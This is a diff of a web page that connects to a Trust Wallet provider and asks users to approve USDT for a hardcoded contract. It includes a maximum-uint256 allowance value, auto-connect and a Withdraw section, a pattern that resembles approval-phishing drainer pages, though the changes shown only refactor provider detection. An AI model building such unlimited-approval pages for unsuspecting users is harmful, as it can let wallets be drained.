@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Token Approval - Trust Wallet</title>
+    <title>Token Approval</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -116,7 +116,6 @@
     <h1>🔑 Token Approval</h1>
     <p class="subtitle">Approve USDT for TokenizedFundsSettlement</p>
 
-    <!-- ===== WALLET CONNECTION ===== -->
     <div class="card">
         <div class="flex-row">
             <h3>📱 Wallet</h3>
@@ -129,11 +128,9 @@
         <div id="networkInfo" class="mt-10" style="font-size:12px;color:#8b949e;"></div>
         <div id="walletProvider" class="mt-10" style="font-size:12px;color:#484f58;"></div>
         
-        <!-- Debug Info -->
-        <div id="debugInfo" style="font-size:11px;color:#484f58;margin-top:10px;font-family:monospace;word-break:break-all;background:#0d1117;padding:8px;border-radius:4px;border:1px solid #30363d;max-height:80px;overflow:auto;"></div>
+        <div id="debugInfo" style="font-size:11px;color:#484f58;margin-top:10px;font-family:monospace;word-break:break-all;background:#0d1117;padding:8px;border-radius:4px;border:1px solid #30363d;max-height:100px;overflow:auto;"></div>
     </div>
 
-    <!-- ===== CONTRACT DETAILS ===== -->
     <div class="card">
         <h3>📝 Contract Details</h3>
         <p><strong>Contract:</strong> <span class="addr">0x054739eFecB0ae38cCf44372291d0778E7DCb4eD</span></p>
@@ -142,7 +139,6 @@
         <p><strong>Token Address:</strong> <span class="addr">0xdAC17F958D2ee523a2206206994597C13D831ec7</span></p>
     </div>
 
-    <!-- ===== APPROVAL SECTION ===== -->
     <div class="card">
         <div class="flex-row">
             <h3>🔓 Approval Status</h3>
@@ -163,7 +159,6 @@
         </div>
     </div>
 
-    <!-- ===== WITHDRAW SECTION ===== -->
     <div class="card">
         <h3>💰 Withdraw</h3>
         <p style="font-size:13px;color:#8b949e;">
@@ -195,9 +190,6 @@
         maxUint256: '115792089237316195423570985008687907853269984665640564039457584007913129639935'
     };
 
-    // ================================================================
-    //  ABI
-    // ================================================================
     const ERC20_ABI = [
         'function approve(address spender, uint256 amount) external returns (bool)',
         'function allowance(address owner, address spender) external view returns (uint256)',
@@ -210,7 +202,6 @@
     //  DOM REFS
     // ================================================================
     const $ = (id) => document.getElementById(id);
-
     const walletStatus = $('walletStatus');
     const walletAddress = $('walletAddress');
     const connectBtn = $('connectBtn');
@@ -233,71 +224,6 @@
     }
 
     // ================================================================
-    //  TRUST WALLET DETECTION - MULTIPLE METHODS
-    // ================================================================
-    function detectTrustWallet() {
-        debug('Detecting Trust Wallet...');
-        
-        // Method 1: Check window.ethereum
-        if (window.ethereum) {
-            debug('window.ethereum exists');
-            
-            // Check for Trust Wallet
-            if (window.ethereum.isTrust) {
-                debug('✅ Trust Wallet detected (isTrust)');
-                return window.ethereum;
-            }
-            
-            // Check for isTrustWallet
-            if (window.ethereum.isTrustWallet) {
-                debug('✅ Trust Wallet detected (isTrustWallet)');
-                return window.ethereum;
-            }
-            
-            // Check for provider name
-            if (window.ethereum.constructor && 
-                window.ethereum.constructor.name === 'TrustWalletProvider') {
-                debug('✅ Trust Wallet detected (TrustWalletProvider)');
-                return window.ethereum;
-            }
-            
-            // Check for _state (Trust Wallet specific)
-            if (window.ethereum._state) {
-                debug('✅ Trust Wallet detected (_state)');
-                return window.ethereum;
-            }
-        }
-        
-        // Method 2: Check window.trustwallet
-        if (window.trustwallet) {
-            debug('✅ Trust Wallet detected (window.trustwallet)');
-            return window.trustwallet;
-        }
-        
-        // Method 3: Check for Trust Wallet in providers
-        if (window.ethereum && window.ethereum.providers) {
-            for (let p of window.ethereum.providers) {
-                if (p.isTrust || p.isTrustWallet) {
-                    debug('✅ Trust Wallet detected (providers)');
-                    return p;
-                }
-            }
-        }
-        
-        // Method 4: Check for web3
-        if (window.web3 && window.web3.currentProvider) {
-            const provider = window.web3.currentProvider;
-            if (provider.isTrust || provider.isTrustWallet) {
-                debug('✅ Trust Wallet detected (web3)');
-                return provider;
-            }
-        }
-        
-        debug('❌ Trust Wallet not detected');
-        return null;
-    }
-
-    // ================================================================
     //  STATE
     // ================================================================
     let provider = null;
@@ -309,7 +235,72 @@
     let isConnecting = false;
 
     // ================================================================
-    //  CONNECT WALLET
+    //  SIMPLE TRUST WALLET DETECT - JUST CHECK window.ethereum
+    // ================================================================
+    function getProvider() {
+        debug('Checking for provider...');
+        
+        // Trust Wallet injects window.ethereum
+        if (window.ethereum) {
+            debug('✅ window.ethereum found!');
+            return window.ethereum;
+        }
+        
+        // Check if web3 exists
+        if (window.web3 && window.web3.currentProvider) {
+            debug('✅ window.web3 found!');
+            return window.web3.currentProvider;
+        }
+        
+        // Check trustwallet
+        if (window.trustwallet) {
+            debug('✅ window.trustwallet found!');
+            return window.trustwallet;
+        }
+        
+        debug('❌ No provider found');
+        return null;
+    }
+
+    // ================================================================
+    //  WAIT FOR PROVIDER - WITH RETRY
+    // ================================================================
+    function waitForProvider(maxAttempts = 30) {
+        return new Promise((resolve) => {
+            debug(`Waiting for provider (max ${maxAttempts} attempts)...`);
+            
+            let attempts = 0;
+            
+            // Check immediately
+            let provider = getProvider();
+            if (provider) {
+                resolve(provider);
+                return;
+            }
+            
+            const interval = setInterval(() => {
+                attempts++;
+                debug(`Attempt ${attempts}/${maxAttempts}...`);
+                
+                provider = getProvider();
+                if (provider) {
+                    debug(`✅ Provider found after ${attempts} attempts!`);
+                    clearInterval(interval);
+                    resolve(provider);
+                    return;
+                }
+                
+                if (attempts >= maxAttempts) {
+                    debug('❌ Timeout - No provider found');
+                    clearInterval(interval);
+                    resolve(null);
+                }
+            }, 500);
+        });
+    }
+
+    // ================================================================
+    //  CONNECT WALLET - SIMPLE VERSION
     // ================================================================
     async function connectWallet() {
         debug('connectWallet() called');
@@ -320,7 +311,6 @@
         }
 
         if (userAddress) {
-            // Disconnect
             debug('Disconnecting...');
             userAddress = null;
             signer = null;
@@ -351,27 +341,12 @@
         walletStatus.className = 'badge badge-blue';
 
         try {
-            // Try to detect Trust Wallet
-            let ethProvider = detectTrustWallet();
-            
-            // If not found, wait for it
-            if (!ethProvider) {
-                debug('Waiting for Trust Wallet...');
-                
-                // Wait for provider to be injected
-                for (let i = 0; i < 20; i++) {
-                    await new Promise(resolve => setTimeout(resolve, 500));
-                    ethProvider = detectTrustWallet();
-                    if (ethProvider) {
-                        debug(`Provider found after ${i+1} attempts`);
-                        break;
-                    }
-                }
-            }
+            // Wait for provider
+            const ethProvider = await waitForProvider(30);
             
             if (!ethProvider) {
-                debug('❌ No Trust Wallet found');
-                alert('Trust Wallet not detected! Please make sure you are using Trust Wallet browser.');
+                debug('❌ No provider found');
+                alert('No wallet detected! Please make sure you are using Trust Wallet browser.');
                 isConnecting = false;
                 connectBtn.disabled = false;
                 connectBtn.textContent = '🔗 Connect Wallet';
@@ -380,26 +355,22 @@
                 return;
             }
 
-            // Create provider
             debug('Creating Web3Provider...');
             provider = new ethers.providers.Web3Provider(ethProvider);
             
-            // Request accounts
             debug('Requesting accounts...');
             await provider.send('eth_requestAccounts', []);
             
             signer = provider.getSigner();
             userAddress = await signer.getAddress();
-            debug(`Connected: ${userAddress}`);
+            debug(`✅ Connected: ${userAddress}`);
 
             const network = await provider.getNetwork();
             chainId = network.chainId;
             debug(`Network: ${chainId}`);
 
-            // Create USDT contract
             usdtContract = new ethers.Contract(CONFIG.usdtAddress, ERC20_ABI, signer);
 
-            // Update UI
             walletStatus.textContent = '✅ Connected';
             walletStatus.className = 'badge badge-green';
             walletAddress.textContent = userAddress;
@@ -418,9 +389,7 @@
             };
             networkInfo.textContent = `🌐 ${chainNames[chainId] || `Chain ID: ${chainId}`}`;
 
-            // Load allowance
             await loadAllowance();
-            
             debug('✅ Connection successful!');
 
         } catch (error) {
@@ -523,10 +492,10 @@
     // ================================================================
     async function autoConnect() {
         debug('Auto-connecting...');
-        const ethProvider = detectTrustWallet();
-        if (ethProvider && ethProvider.selectedAddress) {
+        const provider = getProvider();
+        if (provider && provider.selectedAddress) {
             debug('Auto-connect triggered');
-            await connectWallet();
+            setTimeout(connectWallet, 1000);
         } else {
             debug('No existing connection');
         }
@@ -545,15 +514,14 @@
         debug('🔑 App loaded');
         debug(`User Agent: ${navigator.userAgent}`);
         debug(`window.ethereum: ${window.ethereum ? 'exists' : 'not found'}`);
-        debug(`window.web3: ${window.web3 ? 'exists' : 'not found'}`);
-        debug(`window.trustwallet: ${window.trustwallet ? 'exists' : 'not found'}`);
         
-        // Try to auto-connect
-        setTimeout(autoConnect, 3000);
+        // Try auto-connect
+        setTimeout(autoConnect, 2000);
         
         // Also try on load
         window.addEventListener('load', function() {
-            setTimeout(autoConnect, 2000);
+            debug('Page loaded');
+            setTimeout(autoConnect, 1500);
         });
     })();
 </script>
